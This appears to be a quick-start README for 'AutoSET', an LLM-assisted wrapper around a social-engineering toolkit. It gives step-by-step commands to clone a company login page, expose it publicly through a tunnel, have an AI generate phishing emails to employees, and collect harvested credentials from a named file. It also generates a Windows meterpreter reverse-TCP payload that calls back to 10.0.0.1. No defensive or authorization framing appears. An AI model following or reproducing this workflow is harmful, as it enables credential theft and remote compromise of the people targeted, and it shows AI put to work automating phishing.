# AutoSET Quick Start

## Installation (One-Time Setup)

```bash
cd ~/SET
source venv/bin/activate  # or: source autosetenv/bin/activate
pip install -r requirements.txt
```

## Running AutoSET

```bash
cd ~/SET
source venv/bin/activate
python autoset.py
```

## Quick Commands

```bash
# Credential Harvesting
autoset> /harvest https://example.com

# Make it public
autoset> /tunnel 8080

# Generate phishing email
autoset> /phish target@email.com "urgent password reset"

# Generate payload
autoset> /payload windows/meterpreter/reverse_tcp 10.0.0.1

# List payloads
autoset> /list-payloads windows

# Help
autoset> /help

# Exit
autoset> /exit
```

## Complete Workflow

```bash
# 1. Start AutoSET
python autoset.py

# 2. Clone target site and start harvester
autoset> /harvest https://company.com/login

# 3. Make it publicly accessible
autoset> /tunnel 8080
# Note the public URL (e.g., https://abc123.ngrok.io)

# 4. Generate phishing email
autoset> /phish employee@company.com "account verification required"

# 5. Send email with public URL
# (Email saved to workspace, send manually or via SMTP)

# 6. Monitor captured credentials
# Check: ~/.autoset/workspaces/session_*/harvested_creds.json
```

## Troubleshooting

**"No module named 'autoset'"**
```bash
# Use the launcher script
python autoset.py  # NOT python autoset/agent.py
```

**"All LLM providers failed"**
```bash
# Make sure Ollama is running
ollama serve

# Or configure API keys in autoset/config/
```

**"Port already in use"**
```bash
# Kill existing process
lsof -ti:8080 | xargs kill
```

## Files & Locations

- **Workspaces**: `~/.autoset/workspaces/`
- **Logs**: `~/.autoset/logs/`
- **Captured Creds**: `~/.autoset/workspaces/session_*/harvested_creds.json`
- **Config**: `~/SET/autoset/config/`

## Repository

https://github.com/djBrandy/autoset
